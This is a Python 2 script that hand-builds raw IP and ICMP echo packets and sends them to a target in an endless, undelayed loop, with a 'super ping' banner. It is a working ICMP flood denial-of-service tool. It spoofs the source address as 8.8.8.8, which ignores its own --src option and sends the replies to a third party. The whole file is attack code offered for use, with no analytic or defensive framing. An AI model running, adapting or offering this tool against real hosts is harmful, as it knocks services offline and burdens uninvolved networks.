#!/usr/bin/env python
#-*- coding:utf-8 -*-
import socket
import struct
import time
import sys

from optparse import OptionParser

def chksum(packet):
    sum = 0
    i = 0
    p_len = len(packet)

    while i < p_len-1:
        sum = (ord(packet[i]) << 8) + ord(packet[i+1]) + sum
        i += 2
    if p_len/2 & 1:
        sum += ord(packet[p_len-1])
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    sum = sum >> 8 | (sum << 8 & 0xffff)
    sum = sum ^ 0xffff
    return sum

def get_data(src_ip, dst_ip):
    tcp_header = struct.pack('bbHHHbbH', 0x45, 0, 1490, 
                            12736, 0, 64, 1, 0) \
                            + socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
    sum = chksum(tcp_header)
    tcp_header = struct.pack('bbHHHbbH', 0x45, 0, 1490,
                            12736, 0, 64, 1, sum) + \
                            socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
    icmp_header = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    sum = chksum(icmp_header)
    icmp_header = struct.pack('bbHHh', 8, 0, sum, 1, 1)
    icmp_data = b'\x00' * 1450

    return tcp_header + icmp_header + icmp_data

def get_opt():
    parser = OptionParser()
    parser.add_option("-s", "--src", dest="src_ip",
            default=socket.gethostbyname(socket.gethostname()),
            help="src ip address.")
    parser.add_option("-d", "--dst", dest="dst_ip",
            help="dst ip address.")
    
    (options, args) = parser.parse_args()
    return options

def main():
    options = get_opt()
    try:
        dst_ip = socket.gethostbyname(options.dst_ip)
        if not dst_ip:
            raise
    except:
        print "Please input the correct host ..."
        exit(1)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except socket.error, e:
        print "Create socket error: %s" %e
        exit(1)

    send_data = get_data('8.8.8.8', dst_ip)

    try:
        s.sendto(send_data, (dst_ip, 1))
    except socket.error, e:
        print "dst ip address error: %s" % e
        exit(1)
    
    print "Now begin super ping to %s" % dst_ip
    i = 1
    while 1:
        s.sendto(send_data, (dst_ip, 1))
        i += 1
        if i%10000 == 0:
            print "%d packets sent..." % i
        #time.sleep(0.1)

if __name__ == "__main__":
    main()
